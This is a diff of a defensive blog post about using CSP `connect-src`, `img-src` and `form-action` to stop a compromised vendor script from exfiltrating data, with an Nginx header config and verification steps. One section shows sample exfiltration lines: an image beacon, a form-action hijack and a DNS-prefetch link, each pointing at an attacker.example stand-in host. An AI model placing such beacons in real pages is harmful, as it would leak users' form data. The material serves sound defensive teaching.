@@ -6,11 +6,16 @@ tags: ["security", "csp", "frontend", "xss"]
 series: "advent-2026"
 adventDay: 1
 draft: false
+socialSummary: |
+  2FA on. Servers patched. CI security checks green.
+  Then a 3rd-party A/B testing script compromises 178 major sites overnight, and only 15% had a strict enough CSP to block data exfiltration.
+
+  Day 01/24 of the 2026 DevSec Advent Calendar: why CSP `connect-src` (paired with `form-action` and `img-src`) is your last line of defense when a trusted vendor script turns hostile.
 ---
 
 Most engineering teams treat **Content Security Policy (CSP)** as a binary defense against Cross-Site Scripting (XSS): lock down `script-src`, allowlist your CDN and analytics provider, and call it a day.
 
-Unfortunately, modern client-side compromises rarely rely on injecting a brand-new `<script>` tag into your DOM. Instead, attackers compromise a vendor you already trust—an A/B testing snippet, customer chat widget, or telemetry SDK already present in your `script-src` allowlist.
+Unfortunately, modern client-side compromises rarely rely on injecting a brand-new `<script>` tag into your DOM. Instead, attackers compromise a vendor you already trust (an A/B testing snippet, customer chat widget, or telemetry SDK) that is already sitting in your `script-src` allowlist.
 
 > **Real-World Receipt (Nov 2026):** During the Optimizely supply-chain attack that hit **178 major sites**, attackers piggybacked on an already-trusted script origin. Post-incident analysis showed that **only 15% of affected sites** had a strict enough CSP (`connect-src`, `form-action`, and `img-src`) to block payload delivery and data exfiltration once the vendor bundle executed.
 
@@ -28,7 +33,7 @@ Suppose your marketing site or web application loads an A/B testing script from 
 Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted-ab-test.example;
 ```
 
-Wait—what happens if you omit `connect-src`, or worse, set `connect-src *` because a developer got tired of CORS/CSP console errors during local testing?
+What happens if you omit `connect-src`, or worse, set `connect-src *` because someone got tired of CSP console errors during local testing?
 
 1. While `default-src 'self'` acts as a fallback for `connect-src`, many production policies explicitly widen `connect-src` to `https:` or `*` to accommodate dynamic API endpoints and third-party telemetry beacons.
 2. If `sdk.js` is compromised upstream (Magecart-style supply-chain attack), the injected JavaScript runs with full access to the page context.
@@ -52,15 +57,15 @@ document.querySelector('form')?.addEventListener('submit', (event) => {
 
 ## How `connect-src` Blocks the Exfiltration Channel
 
-The `connect-src` directive restricts the URLs which can be loaded using script interfaces:
+The `connect-src` directive restricts the URLs that can be loaded using script interfaces:
 
 - `fetch()` and `XMLHttpRequest`
 - `navigator.sendBeacon()`
 - `WebSocket` (`ws:` / `wss:`)
 - `EventSource` (Server-Sent Events)
-- `<a ping>` Auditing
+- `<a ping>` auditing
 
-When you explicitly lock `connect-src` to the exact origins that receive telemetry or API calls, the browser blocks any network request to an unlisted domain—even when initiated by an allowlisted script.
+When you explicitly lock `connect-src` to the exact origins that receive telemetry or API calls, the browser blocks any network request to an unlisted domain, even when initiated by an allowlisted script.
 
 | API / Mechanism | Governed by `script-src`? | Governed by `connect-src`? |
 | :--- | :--- | :--- |
@@ -74,30 +79,35 @@ When you explicitly lock `connect-src` to the exact origins that receive telemet
 
 ## Production-Ready Nginx Configuration
 
-Below is a hardened Nginx configuration snippet that enforces a strict `connect-src` allowlist alongside essential browser security headers:
+Below is a hardened Nginx configuration (Nginx 1.25.1+) that enforces a strict `connect-src` allowlist alongside essential browser security headers:
 
 ```nginx
 server {
-    listen 443 ssl http2;
+    listen 443 ssl;
+    http2 on;
     server_name hristov.dev;
 
     # Strict Content Security Policy with explicit connect-src boundary
-    set $csp_default  "default-src 'self';";
-    set $csp_script   "script-src 'self' https://cdn.trusted-ab-test.example;";
-    set $csp_style    "style-src 'self' 'unsafe-inline';";
-    set $csp_img      "img-src 'self' data:;";
-    set $csp_font     "font-src 'self';";
-    set $csp_connect  "connect-src 'self' https://telemetry.trusted-ab-test.example;";
+    set $csp_default   "default-src 'self';";
+    set $csp_script    "script-src 'self' https://cdn.trusted-ab-test.example;";
+    set $csp_style     "style-src 'self' 'unsafe-inline';";
+    set $csp_img       "img-src 'self' data:;";
+    set $csp_font      "font-src 'self';";
+    set $csp_connect   "connect-src 'self' https://telemetry.trusted-ab-test.example;";
     set $csp_hardening "object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests;";
 
+    # Roll out with Content-Security-Policy-Report-Only first, then switch to enforcing:
     add_header Content-Security-Policy "${csp_default} ${csp_script} ${csp_style} ${csp_img} ${csp_font} ${csp_connect} ${csp_hardening}" always;
 
     # Defense-in-depth companion headers
     add_header X-Frame-Options "DENY" always;
     add_header X-Content-Type-Options "nosniff" always;
     add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+    add_header X-DNS-Prefetch-Control "off" always;
 }
 ```
+
+> **Nginx Gotcha:** If any nested `location` block defines its own `add_header` (such as `Cache-Control` for static assets), Nginx **stops inheriting server-level `add_header` directives** in that block. Repeat your CSP header inside those `location` blocks or move shared headers into an `include security-headers.conf;` snippet.
 
 ---
 
@@ -105,21 +115,35 @@ server {
 
 A determined attacker blocked by `connect-src` will immediately fall back to secondary exfiltration channels:
 
-1. **Image Beacons (`new Image().src = 'https://attacker.example/?d=' + data`):** Prevent this by never setting `img-src *` or `img-src https:`. Keep `img-src 'self' data:` (plus your explicit image CDN).
-2. **Form Hijacking (`form.action = 'https://attacker.example'`):** Always specify `form-action 'self'`, which does **not** fall back to `default-src`!
-3. **DNS Prefetch / Dynamic Link Injection:** Restrict `default-src 'self'` and monitor violations with `report-to` or `report-uri`.
-
-### Key Takeaway for Day 01
-
-Never use `connect-src https:` or `connect-src *` in production. Separate the origin hosting a third-party script (`script-src`) from the exact ingestion endpoint (`connect-src`), and pair it with strict `img-src` and `form-action` directives to close the exfiltration loop.
+1. **Image Beacons (`new Image().src = 'https://attacker.example/?d=' + data`):** Never set `img-src *` or `img-src https:`. Keep `img-src 'self' data:` (plus your explicit image CDN).
+2. **Form Hijacking (`form.action = 'https://attacker.example'`):** Always specify `form-action 'self'`, which does **not** fall back to `default-src`.
+3. **DNS Prefetch Exfiltration (`<link rel="dns-prefetch" href="//secret.attacker.example">`):** CSP does not cover DNS prefetching. Disable it explicitly with `X-DNS-Prefetch-Control: off`.
+4. **Sensitive Route Exposure:** Even a strict CSP allows a vendor script to talk to its *own* allowed telemetry domain. That is why [Day 02](/blog/advent-day-02-isolate-sensitive-routes) strips third-party tags off `/login` and `/checkout` completely.
 
 ---
 
-## Social Summary (X & LinkedIn)
+## Verify It in 60 Seconds
 
-```text
-2FA on. Servers patched. CI security checks green.
-Then a 3rd-party A/B testing script compromises 178 major sites overnight—and only 15% had a strict enough CSP to block data exfiltration.
+Inspect your live production CSP header and confirm there are no wildcard `connect-src *` or `https:` grants, then test an unauthorized `fetch()` in DevTools Console:
 
-Day 01/24 of the 2026 DevSec Advent Calendar: Why CSP `connect-src` (paired with `form-action` and `img-src`) is your last line of defense when a trusted vendor script turns hostile.
+```bash
+# 1. Inspect the active CSP header from production
+curl -sI https://your-domain.example | grep -i '^content-security-policy'
 ```
+
+```javascript
+// 2. Run in Browser DevTools Console on your site (must throw a CSP violation)
+fetch('https://example.com/exfil-test').catch(console.error);
+```
+
+### Key Takeaway for Day 01
+
+Never use `connect-src https:` or `connect-src *` in production. Roll out changes with `Content-Security-Policy-Report-Only`, separate the origin hosting a third-party script (`script-src`) from its exact ingestion endpoint (`connect-src`), and pair it with strict `img-src`, `form-action`, and `X-DNS-Prefetch-Control: off` to close the exfiltration loop.
+
+---
+
+## References
+
+- [MDN: CSP `connect-src` Directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src)
+- [MDN: `Content-Security-Policy-Report-Only`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy-Report-Only)
+- [MDN: `X-DNS-Prefetch-Control`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-DNS-Prefetch-Control)
